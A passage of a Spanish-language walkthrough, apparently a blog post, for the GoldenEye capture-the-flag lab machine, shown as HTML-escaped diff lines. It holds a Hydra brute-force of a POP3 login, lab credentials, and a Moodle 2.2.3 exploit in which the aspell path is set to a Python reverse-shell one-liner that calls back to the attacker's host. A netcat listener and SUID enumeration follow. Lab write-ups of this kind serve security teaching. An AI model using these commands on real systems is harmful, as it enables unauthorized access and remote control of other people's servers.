+Return-Path: &amp;lt;root@ubuntu&amp;gt;
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 17C96454B1
+        for &amp;lt;natalya&amp;gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: &amp;lt;20180425031956.17C96454B1@ubuntu&amp;gt;
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it'&lt;/span&gt;s related to security...even &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;it&lt;span class=&quot;s1&quot;&gt;'s not, just enter it in under the guise of &quot;security&quot;...it'&lt;/span&gt;ll get the change order escalated without much hassle :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you didn&lt;span class=&quot;s1&quot;&gt;'t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you'&lt;/span&gt;re a Linux user just point this servers IP to severnaya-station.com &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /etc/hosts.
+
+
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Contamos con credenciales del usuario &lt;strong&gt;xenia&lt;/strong&gt;; sin embargo, no sabemos que sean reutilizables y sean de correo o del dominio que indican &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;severnaya-station.com/gnocertdir&lt;/code&gt;, por lo tanto primero vamos a probar para el servicio POP3 y en caso no ser válido, utilizaremos fuerza bruta para tratar de obtener sus credenciales.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ telnet 10.0.0.24 55007
+Trying 10.0.0.24...
+Connected to 10.0.0.24.
+Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
++OK GoldenEye POP3 Electronic-Mail System
+USER xenia
++OK
+PASS RCP90rulez!
+&lt;span class=&quot;nt&quot;&gt;-ERR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;AUTH] Authentication failed.
+QUIT
++OK Logging out
+Connection closed by foreign host.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que no aplican, así que vamos vamos a agregar el dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;severnaya-station.com&lt;/code&gt; a nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; ya que se está aplicando &lt;em&gt;virtual hosting&lt;/em&gt; y vamos a checar el recurso que nos indican &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;severnaya-station.com/gnocertdir&lt;/code&gt;, que ya debemos estar pensando que debe tener un panel de login.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y tenemos un CMS (gestor de contenido) Moodle, así que vamos a tratar de loggearnos utilizando las credenciales que tenemos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Navegando dentro del sitio, en &lt;strong&gt;&lt;em&gt;My profile &amp;gt; Messages&lt;/em&gt;&lt;/strong&gt; tenemos un mensaje del usuario &lt;strong&gt;Dr Doak&lt;/strong&gt; :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Básicamente nos dice que el usuario de correo electrónico es &lt;strong&gt;doak&lt;/strong&gt;; por lo que ya debemos estar pensando que tratar de utilizar fuerza bruta para obtener su contraseña.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; doak &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /usr/share/wordlists/fasttrack.txt pop3://10.0.0.24 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 55007
+Hydra v9.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 by van Hauser/THC &amp;amp; David Maciejak - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this is non-binding, these &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; ignore laws and ethics anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2022-01-01 18:45:53
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Restorefile &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;you have 10 seconds to abort... &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use option &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; to skip waiting&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; from a previous session found, to prevent overwriting, ./hydra.restore
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:222&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~14 tries per task
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking pop3://10.0.0.24:55007/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 80.00 tries/min, 80 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:01h, 142 to &lt;span class=&quot;k&quot;&gt;do in &lt;/span&gt;00:02h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 72.00 tries/min, 144 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:02h, 78 to &lt;span class=&quot;k&quot;&gt;do in &lt;/span&gt;00:02h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;55007][pop3] host: 10.0.0.24   login: doak   password: goat
+1 of 1 target successfully completed, 1 valid password found
+Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2022-01-01 18:48:21
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos las credenciales de &lt;strong&gt;doak&lt;/strong&gt; así que vamos a echarle un ojo a los correos que tiene:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ telnet 10.0.0.24 55007
+Trying 10.0.0.24...
+Connected to 10.0.0.24.
+Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
++OK GoldenEye POP3 Electronic-Mail System
+USER doak
++OK
+PASS goat
++OK Logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+LIST
++OK 1 messages:
+1 606
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+RETR 1 
++OK 606 octets
+Return-Path: &amp;lt;doak@ubuntu&amp;gt;
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;localhost &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        by ubuntu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Postfix&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with SMTP &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;97DC24549D
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &amp;lt;doak&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Tue, 30 Apr 1995 20:47:24 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Message-Id: &amp;lt;20180425034731.97DC24549D@ubuntu&amp;gt;
+Date: Tue, 30 Apr 1995 20:47:24 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+From: doak@ubuntu
+
+James,
+If you&lt;span class=&quot;s1&quot;&gt;'re reading this, congrats you'&lt;/span&gt;ve gotten this far. You know how tradecraft works right?
+
+Because I don&lt;span class=&quot;s1&quot;&gt;'t. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: 4England!
+
+.
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos un probable usuario &lt;strong&gt;james&lt;/strong&gt; y unas credenciales de acceso (posiblemente del CMS Moodle), por lo que vamos a tratar de ingresar al sitio con las nuevas credenciales  (&lt;strong&gt;Nota&lt;/strong&gt;: Como siempre, debemos de guardar todas las credenciales que encontremos).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bajo la ruta &lt;strong&gt;&lt;em&gt;My profile &amp;gt; My private files&lt;/em&gt;&lt;/strong&gt; vemos un recurso llamado &lt;strong&gt;s3cret.txt&lt;/strong&gt;, así que le echamos un ojo:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;s3cret.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: s3cret.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 007,
+   2   │ 
+   3   │ I was able to capture this apps adm1n cr3ds through clear txt. 
+   4   │ 
+   5   │ Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
+   6   │ 
+   7   │ Something juicy is located here: /dir007key/for-007.jpg
+   8   │ 
+   9   │ Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Básicamente lo que nos dice es que chequemos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dir007key/for-007.jpg&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos vemos nada interesante en la imagen, así que vamos a descargarla y tratar de ver metadatos o si se está aplicando esteganografía.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ exiftool &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-007&lt;/span&gt;.jpg
+ExifTool Version Number         : 12.16
+File Name                       : &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-007&lt;/span&gt;.jpg
+Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+File Size                       : 15 KiB
+File Modification Date/Time     : 2022:01:01 18:58:04-06:00
+File Access Date/Time           : 2022:01:01 18:58:04-06:00
+File Inode Change Date/Time     : 2022:01:01 18:58:14-06:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+X Resolution                    : 300
+Y Resolution                    : 300
+Exif Byte Order                 : Big-endian &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Motorola, MM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Image Description               : &lt;span class=&quot;nv&quot;&gt;eFdpbnRlcjE5OTV4IQ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
+Make                            : GoldenEye
+Resolution Unit                 : inches
+Software                        : linux
+Artist                          : For James
+Y Cb Cr Positioning             : Centered
+Exif Version                    : 0231
+Components Configuration        : Y, Cb, Cr, -
+User Comment                    : For 007
+Flashpix Version                : 0100
+Image Width                     : 313
+Image Height                    : 212
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Image Size                      : 313x212
+Megapixels                      : 0.066
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En la descripción de la imagen vemos algo curioso, es una cadena en base 64, así que vamos a obtenerla en texto claro.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;eFdpbnRlcjE5OTV4IQ==&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
+&lt;/span&gt;xWinter1995x!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos una contraseña y lo más seguro es que sea del usuario &lt;strong&gt;admin&lt;/strong&gt; de acuerdo con el mensaje que vimos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3cret.txt&lt;/code&gt;; así que vamos a tratar de loggearnos en el gestor de contenido.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como nos encontramos como el usuario &lt;strong&gt;admin&lt;/strong&gt;, podemos modificar algunas cosas del gestor del contenido, por lo que si buscamos un exploit público asociado a &lt;strong&gt;Moodle 2.2.3&lt;/strong&gt; encontramos payloads del framework de metasploit; pero en este sitio cristiano no ocupamos ese tipo de cosas, por lo que vamos a analizar lo que hace el &lt;a href=&quot;https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/29324.rb&quot;&gt;exploit&lt;/a&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Primero nos dice que debemos ir a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/gnocertdir/admin/settings.php?section=editorsettingstinymce&lt;/code&gt; y modificar el valor de &lt;strong&gt;Spell engine&lt;/strong&gt; por &lt;strong&gt;PSpellShell&lt;/strong&gt; y guardamos los cambios.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Después debemos ir a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/gnocertdir/admin/settings.php?section=systempaths&lt;/code&gt; y en el parámetro &lt;strong&gt;Path to aspell&lt;/strong&gt; debemos poner nuestro comando que nos entable una reverse shell, para este caso utilizaremos python con la siguiente instrucción: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.25&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/code&gt; y guardamos los cambios.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Ahora necesitamos consulta el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker/rpc.php&lt;/code&gt; .&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Damos click secundario y elegimos la opción de &lt;strong&gt;Inspeccionar&lt;/strong&gt;, en la nueva ventana que nos aparece seleccionamos &lt;strong&gt;Red&lt;/strong&gt; y volvemos a cargar la página.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Le damos click secundario a la petición que se realiza y seleccionamos la opción &lt;strong&gt;Editar y reenviar&lt;/strong&gt;. El método lo debemos cambiar de &lt;strong&gt;GET&lt;/strong&gt; a &lt;strong&gt;POST&lt;/strong&gt; en el el &lt;strong&gt;Cuerpo de la petición&lt;/strong&gt; agregamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{&quot;id&quot;:&quot;c0&quot;,&quot;method&quot;:&quot;checkWords&quot;,&quot;params&quot;:[&quot;en&quot;,[&quot;&quot;]]}&lt;/code&gt; y antes de envíar la petición, nos ponemos en escucha por el puerto 443 y la enviamos.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.25] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.24] 38871
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
+$ whoami
+www-data
+$ 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro del sistema y para trabajar más cómodos, vamos a hacer un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt;. Ahora vamos a enumerar un poco el sistema para encontrar una forma de escalar privilegios, debido a que somos el usuario &lt;strong&gt;www-data&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+www-data@ubuntu:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data: 
+www-data@ubuntu:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
+www-data@ubuntu:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
+./bin/umount
+./bin/ping6
+./bin/ping
+./bin/su
+./bin/mount
+./bin/fusermount
+./usr/bin/chfn
+./usr/bin/sudo
+./usr/bin/chsh
+./usr/bin/gpasswd
+./usr/bin/newgrp
+./usr/bin/mtr
+./usr/bin/passwd
+./usr/bin/traceroute6.iputils
+./usr/lib/openssh/ssh-keysign
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/pt_chown
+./usr/sbin/pppd
+./usr/sbin/uuidd
+www-data@ubuntu:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www/html/
+www-data@ubuntu:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 264
+drwxr-xr-x  3 www-data www-data   4096 Apr 25  2018 006-final
+drwxr-xr-x  2 www-data www-data   4096 Apr 25  2018 dir007key
+drwxr-xr-x 41 www-data www-data   4096 Apr 25  2018 gnocertdir
+&lt;span class=&quot;nt&quot;&gt;-rwxr--r--&lt;/span&gt;  1 www-data www-data    354 Apr 24  2018 index.css
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    252 Apr 25  2018 index.html
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data  39748 Apr 24  2018 logo.png
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data      4 Apr 25  2018 rtm.log
+drwxr-xr-x  2 www-data www-data   4096 Apr 24  2018 sev-home
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 184883 Apr 25  2018 sniper.png
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data   2301 Apr 29  2018 space.gif
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data   1414 Apr 29  2018 splashAdmin.php
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data   1349 Apr 24  2018 terminal.js
+www-data@ubuntu:/var/www/html&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dentro del directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; tenemos algo que nos debería de llamar la atención: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;splashAdmin.php&lt;/code&gt;, así que vamos a echarle un ojo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;splashAdmin.php 
+&amp;lt;html&amp;gt;
+&amp;lt;body &lt;span class=&quot;nv&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;space.gif&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt;h2 &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;color:green;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Cobalt Qube 3 has been decommissioned&amp;lt;/h2&amp;gt;
+&amp;lt;br/&amp;gt;
+&amp;lt;h3 &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;color:white;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;We can use this page to put up team photos, discussion, etc. Natalya is not allowed to post here though &lt;span class=&quot;nt&quot;&gt;--Boris&lt;/span&gt;&amp;lt;/h3&amp;gt;
+&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;p &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;color:red;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Here&lt;span class=&quot;s1&quot;&gt;'s me with my new sniper rifle.&amp;lt;/p&amp;gt;
+&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
+&amp;lt;img src=&quot;sniper.png&quot;&amp;gt;
+&amp;lt;br/&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;p style=&quot;color:orange;&quot;&amp;gt;
+Boris why are you wearing shorts in that photo? You do realize you'&lt;/span&gt;re stationed above the Arctic circle, correct?
+&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
+BTW your favorite pen broke, but I replaced it with a new special one.
+&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
+Natalya &lt;span class=&quot;s2&quot;&gt;&quot;best coder&quot;&lt;/span&gt; S.&amp;lt;/p&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;p &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;color:red;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;License to Kill - Complex Grenade Launchers - No Oddjob&quot;&lt;/span&gt; - Unknown&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/p&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;p style=&quot;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;Greetings ya'll! GoldenEye Admin here.
+&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
